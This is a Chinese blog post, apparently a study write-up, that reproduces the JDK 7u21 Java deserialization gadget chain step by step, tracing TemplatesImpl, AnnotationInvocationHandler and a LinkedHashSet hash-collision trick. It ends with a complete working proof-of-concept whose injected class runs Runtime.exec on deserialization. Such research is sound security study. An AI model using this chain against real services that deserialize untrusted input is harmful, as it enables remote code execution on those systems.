date: 2020-10-04
categories:
- web
tags:
- web
- java
- ctf
title: jdk7u21反序列化复现
---
# JDK7u21反序列化链复现
exp:
```java
public class jdk7u21 {
    public static void main(String[] args) throws Exception {

            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl("calc");//生成恶意的calc
            calc.getOutputProperties();//调用getOutputProperties就可以执行calc
    }
}
```
一步步调试发现在`AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();`弹出calc
![image466](https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png)
第380行是触发命令执行的点


## newInstance
```java
public class instance {
    static{
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String args[]){
        try {
            instance.class.newInstance();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }
}


```
将恶意代码放在static或构造方法中便可以在初始化时执行恶意代码

## getTransletInstance
逐句执行观察到命令执行的限制条件与getOutputProperties和newTransformer没有太大关系
在getTransletInstance中发现一系列的限制
```java
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;//TemplatesImpl._name!=null

            if (_class == null) defineTransletClasses();//TemplatesImpl._class==null

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//_transletIndex在defineTransletClasses中定义
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```
TemplatesImpl._name!=null和TemplatesImpl._class==null是执行到newInstance处的必要条件
而_transletIndex也是在defineTransletClasses中定义
跟进defineTransletClasses查找进一步的限制条件

## defineTransletClasses

```java
private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {//_bytecodes!=null
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new Hashtable();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }//_class.superClass==com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            ...
        }
        ...
    }
```
阅读代码发现`_class[i] = loader.defineClass(_bytecodes[i]);`加载了我们的恶意类，但是它必须是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类
_bytecodes!=null
综上我们可以得知要执行到恶意代码的触发点需要满足以下条件
```
1. TemplatesImpl._name!=null
2. TemplatesImpl._class==null
3. _bytecodes!=null
4. 恶意类是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类
5. TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法（其他版本的限制条件）
```
关于第五点的相关代码是(与7u21略有不同)：
```java
TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new 
        //限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法
        //           即需要是一个TransformerFactoryImpl类
   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
```

## 尝试自己写一个POC
### Gadgets.createTemplatesImpl
跟进
```java
public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        clazz.makeClassInitializer()
                .insertAfter("java.lang.Runtime.getRuntime().exec(\""
                        + command.replaceAll("\"", "\\\"")
                        + "\");");
        // unique name to allow repeated execution (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());//Sets the class name

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes,
                ClassFiles.classAsBytes(Foo.class)});
//                  classBytes});
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
//        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
```
其中clazz是我们的恶意类装在templates的_bytecodes中，templates满足了其他的限制条件
这里用了javassist来构造我们的恶意类

### javassist简介
https://www.cnblogs.com/rickiyang/p/11336268.html
```java

    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    clazz.makeClassInitializer()//Makes an empty class initializer (static constructor).
                    .insertAfter("java.lang.Runtime.getRuntime().exec(\""
                            + command.replaceAll("\"", "\\\"")
                            + "\");");//在方法后面添加代码
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
```

### 自己实现
````java
public class myjdk7u21 {
    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }

    }
    public static void main(String args[]) throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(evil.class));
        CtClass evilobj = pool.get(evil.class.getName());
        evilobj.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"calc\");");
        evilobj.setName("ccreater233"+System.nanoTime());

        final TemplatesImpl tpl = new TemplatesImpl();
        setField(TemplatesImpl.class,tpl,"_name","ccreater");
        setField(TemplatesImpl.class,tpl,"_class",null);
        setField(TemplatesImpl.class,tpl,"_bytecodes",new byte[][]{evilobj.toBytecode()});
        tpl.getOutputProperties();

    }
    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(key);
        field.setAccessible(true);
        field.set(obj,value);
    }
}

````

遇到的坑：evil记得声明为public，不然默认是private,就无法newInstance了

## 动态代理AnnotationInvocationHandler
利用动态代理来接近反序列化后直接RCE的目的
```java
        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,new HashMap());

        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
        proxy.equals(tpl);
```


我们看下AnnotationInvocationHandler的构造方法
```java
AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        this.memberValues = var2;
    }
```
type和memberValues皆可控

debug跟进
proxy.equals 调用了动态代理AnnotationInvocationHandler的invoke方法
```java
    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();
            Class[] var5 = var2.getParameterTypes();
            if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);
            }
            ...
    }
```
方法名为equals且只有一个参数，这进入`this.equalsImpl(var3[0]);`

equalsImpl
```java
private Boolean equalsImpl(Object var1) {
        if (var1 == this) {
            return true;
        } else if (!this.type.isInstance(var1)) {
            return false;
        } else {
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;

            for(int var4 = 0; var4 < var3; ++var4) {
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                if (var9 != null) {
                    var8 = var9.memberValues.get(var6);
                } else {
                    try {
                        var8 = var5.invoke(var1);
                    } catch (InvocationTargetException var11) {
                        return false;
                    } catch (IllegalAccessException var12) {
                        throw new AssertionError(var12);
                    }
                }...
            }
        }
    }
```
在这个方法中调用了`var8 = var5.invoke(var1);`,相当于var1.var5(),其中var1是a.equals(b)中的b
var5是this.type的第一个方法(this.getMemberMethods()[0])
跟进getMemberMethods
```java
private Method[] getMemberMethods() {
        if (this.memberMethods == null) {
            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
                public Method[] run() {
                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                    AccessibleObject.setAccessible(var1, true);
                    return var1;
                }
            });
        }

        return this.memberMethods;
    }
```
也就是说我们可以通过控制this.type从而调用xx.equals(evilObj),来达到evilObj.AnyMethod()的效果
这也恰好符合了我们想调用evilObj.getOutputProperties()情况
最后选择了Templates,它的第一个方法是newTransformer,漏洞点在newTransformer中触发

## LinkedHashSet反序列化调用equals
问我为啥知道这里可以，答：别人发现的
LinkedHashSet没有实现readObject方法而是调用了HashSet的readObject方法，既然如此，为啥不直接调用HashSet嘞
等下就知道了
HashSet::readObject
```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }
```
跟进HashMap::put方法
```java
public V put(K key, V value) {
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        for (Entry<K,V> e = table[i]; e != null; e = e.next) {
            Object k;
            if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    }
```
我们看到key.equals(k)完美的符合了我们的预期
这里得是顺序调用才能常出现proxy.equals(evilObj),所以用了LinkedHashSet
但是在这之前我们要满足两个条件
1. e.hash == hash即hash(proxy) == hash(evilObj)
2. e.key!=key即proxy!=evilObj
第二个条件很容易满足，第一个条件就GG了
跟进int hash = hash(key);中的hash方法看一下发现

```java
final int hash(Object k) {
        int h = 0;
        if (useAltHashing) {
            if (k instanceof String) {
                return sun.misc.Hashing.stringHash32((String) k);
            }
            h = hashSeed;
        }

        h ^= k.hashCode();

        // This function ensures that hashCodes that differ only by
        // constant multiples at each bit position have a bounded
        // number of collisions (approximately 8 at default load factor).
        h ^= (h >>> 20) ^ (h >>> 12);
        return h ^ (h >>> 7) ^ (h >>> 4);
    }
```
调用了key的hashCode方法，即进入了AnnotationInvocationHandler的invoke方法
见证奇迹的时刻：
在invoke中有这样的一句话：
```
if (var4.equals("hashCode")) {
    return this.hashCodeImpl();
```

跟进hashCodeImpl
```java
    private int hashCodeImpl() {
        int var1 = 0;

        Entry var3;
        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
            var3 = (Entry)var2.next();
        }

        return var1;
    }
```
我们关注`var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())`
这相当于`127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))`
因为0^x=x,且*优先级大于^,所以令key.hashcode()=0使得e.hash == hash最终变成
127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))=0^value.hashcode()==value.hashcode()
所以构造
```java
package org.example;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


public class myjdk7u21 {

    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }

    }

    public static void main(String args[]) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(evil.class));
        CtClass evilobj = pool.get(evil.class.getName());
        evilobj.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"calc\");");
        evilobj.setName("ccreater233"+System.nanoTime());

        final TemplatesImpl tpl = new TemplatesImpl();
        setField(TemplatesImpl.class,tpl,"_name","ccreater");
        setField(TemplatesImpl.class,tpl,"_class",null);
        setField(TemplatesImpl.class,tpl,"_bytecodes",new byte[][]{evilobj.toBytecode()});
        //evil instance

        //tpl.getOutputProperties();
        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        HashMap map = new HashMap();
        map.put("f5a5a608","23333");
        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);

        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);

        HashSet a = new LinkedHashSet();
        a.add(tpl);
        a.add(proxy);
        map.put("f5a5a608",tpl);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        //序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(a);//序列化对象
        objectOutputStream.flush();
        objectOutputStream.close();
        //反序列化
        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        Object o = objectInputStream.readObject();

    }
    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(key);
        field.setAccessible(true);
        field.set(obj,value);
    }
}

```